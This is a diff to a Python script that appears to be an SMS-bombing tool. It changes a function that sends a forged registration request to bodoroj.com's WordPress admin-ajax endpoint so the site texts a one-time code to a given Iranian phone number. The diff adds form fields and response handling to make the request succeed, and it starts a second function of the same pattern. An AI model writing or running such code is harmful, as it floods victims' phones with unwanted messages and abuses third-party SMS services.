@@ -104,17 +104,21 @@ def bodoroj(phone):
             instance_id = match.group(1)
         
         if not instance_id:
-            instance_id = "43a3d59390a470b6d1828df85cdad8e1"
+            instance_id = "83143976e95c57bfaa643ec00be89a6a"
         
         url = "https://bodoroj.com/wp-admin/admin-ajax.php"
         
+        # استفاده از پارامترهای کامل
         payload = {
             "login_digt_countrycode": "+98",
-            "digits_phone": digits_phone,  # بدون صفر
+            "digits_phone": digits_phone,
             "digits_email": "",
             "action_type": "phone",
             "digits_reg_name": "نام",
             "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
             "rememberme": "1",
             "digits": "1",
             "instance_id": instance_id,
@@ -123,7 +127,9 @@ def bodoroj(phone):
             "digits_redirect_page": "//bodoroj.com/?page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
             "digits_form": "fa139d7ce8",
             "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
-            "show_force_title": "1"
+            "show_force_title": "1",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
         }
         
         headers = {
@@ -136,18 +142,27 @@ def bodoroj(phone):
         
         response = session.post(url, data=payload, headers=headers, timeout=10)
         
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        
         if response.status_code == 200:
-            response_data = response.json()
-            if response_data.get("success") is True:
-                print(f'{g}(bodoroj) {a}Code Sent')
-                return True
+            try:
+                response_data = response.json()
+                if response_data.get("success") is True:
+                    print(f'{g}(bodoroj) {a}Code Sent')
+                    return True
+            except:
+                if response.text.strip() == "1":
+                    print(f'{g}(bodoroj) {a}Code Sent')
+                    return True
         
         print(f'{r}[-] (bodoroj) Failed{a}')
         return False
             
-    except Exception:
-        print(f'{r}[-] (bodoroj) Failed{a}')
+    except Exception as e:
+        print(f'{r}[!] bodoroj Exception: {e}{a}')
         return False
+
 
 def riiha(phone):
     import requests
